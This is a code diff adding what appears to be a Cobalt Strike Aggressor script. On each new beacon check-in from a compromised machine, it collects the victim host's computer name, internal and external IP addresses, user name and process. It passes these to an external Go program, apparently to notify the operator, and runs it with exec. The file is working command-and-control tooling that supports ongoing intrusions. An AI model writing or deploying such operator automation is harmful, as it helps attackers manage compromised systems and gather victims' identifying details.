@@ -1,0 +1,14 @@
+on beacon_initial {
+
+	println("Initial Beacon Checkin: " . $1 . " PID: " . beacon_info($1,"pid"));
+	local('$internalIP $computerName $userName');
+	$computerName = replace(beacon_info($1,"computer")," ","_");
+	$internalIP = replace(beacon_info($1,"internal")," ","_");
+	$userName = replace(beacon_info($1,"user")," ","_");
+	$externalIP = replace(beacon_info($1,"external")," ","_");
+
+    $proCess = replace(beacon_info($1,"process")," ","_");
+$cmd = 'go run 绝对路径' . " -computername " . $computerName . " -internalip " . $internalIP. " -externalip " . $externalIP .  " -username " . $userName.  " -process " . $proCess ;
+	println("Sending server: " . $cmd);
+	exec($cmd);
+}
